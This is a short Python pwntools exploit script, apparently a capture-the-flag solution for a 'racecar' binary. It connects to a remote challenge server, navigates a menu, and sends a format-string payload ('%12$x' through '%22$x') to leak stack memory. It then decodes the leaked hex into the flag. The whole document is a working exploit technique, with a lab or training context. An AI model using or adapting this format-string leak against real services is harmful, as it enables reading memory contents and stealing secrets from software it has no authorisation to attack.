from pwn import *
import time
elf = context.binary = ELF('./racecar', checksec=False)

#io = elf.process()
io = remote('209.97.189.80', '31877')

print('Getting the flag... ')
io.sendline('DUMB')
time.sleep(1)
io.recv()
io.sendline('DUMB')
time.sleep(1)
io.recv()
io.sendline('2')
time.sleep(1)
io.recv()
io.sendline('2')
time.sleep(1)
io.recv()
io.sendline('1')
time.sleep(1)
io.recv()
time.sleep(1)
payload = '%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x'
io.sendline(payload)

recieved_list = io.recv().split(':')[1].split('\n')[1].split(' ')
flag_list = []

for hexa in recieved_list:
	if len(hexa) % 2 == 0:
		chars = hexa.decode('hex')
		chars = chars[::-1]
		for char in chars:
			if char == '}':
				flag_list.append('}')
				print('baaaaaaaaaaaaaaaaaaaaaaaaaal')
				break
			else:
				flag_list.append(char)
			
	else:
		print('Odd hexa detected')
		break

flag = ''.join(flag_list)

print('Flag recieved: ', flag)
